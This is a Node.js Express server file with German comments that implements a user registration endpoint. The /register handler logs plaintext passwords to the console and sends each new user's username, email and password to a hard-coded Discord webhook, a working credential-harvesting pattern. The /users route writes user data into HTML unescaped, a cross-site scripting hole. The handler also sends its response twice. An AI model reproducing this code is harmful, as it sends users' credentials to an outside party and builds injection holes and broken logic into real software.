// Dynamischer Import von node-fetch
let fetch;
import('node-fetch').then(({default: fetchModule}) => {
    fetch = fetchModule;
    // Initialisierung des Servers und der Routen innerhalb dieses Blocks oder in einer Funktion, die hier aufgerufen wird.
    initServer();
});

function initServer() {
    const express = require('express');
    const bodyParser = require('body-parser');
    const cors = require('cors'); 
    const app = express();
    const port = 3000;


    app.use(cors());
    app.use(bodyParser.json());

    let users = [];

    app.post('/register', (req, res) => {
        const { username, email, password } = req.body;
        users.push({ username, email, password });
        console.log('Empfangene Daten:', username, email, password);
        res.json({ status: 'Erfolg', message: 'Benutzer registriert' });

        // Hier könnten Sie die Daten an einen Discord-Webhook senden
        // Beispiel:
        const webhookUrl = 'https://discord.com/api/webhooks/1113916313782472804/lxdu3ZGmBMCnd01tydvib_LmJcxlehYF9jhAh3zvFP54jpfbRKhvlouhzeP2nBmalo62';
        fetch(webhookUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                content: `Neuer Nutzer registriert: ${username}, Email: ${email}, Passwort: ${password}`,
            }),
        })
        .then(fetchResponse => fetchResponse.json())
        .then(fetchData => {
            console.log(fetchData);
            res.json({ status: 'Erfolg', message: 'Daten empfangen und an Discord gesendet' });
        })
        .catch(error => {
            console.error('Fehler beim Senden an Discord:', error);
            res.status(500).json({ status: 'Fehler', message: 'Problem beim Senden der Daten an Discord' });
        });
    });

    // Route zum Auflisten der Benutzer
app.get('/users', (req, res) => {
    let userList = users.map(user => `<li>${user.username} - ${user.email}</li>`).join('');
    res.send(`<ul>${userList}</ul>`);
});

// Konfigurieren Sie die Middleware für statische Inhalte nach Ihren API-Routen
app.use(express.static('public'));

    app.listen(port, () => {
        console.log(`Server läuft auf http://localhost:${port}`);
    });
}
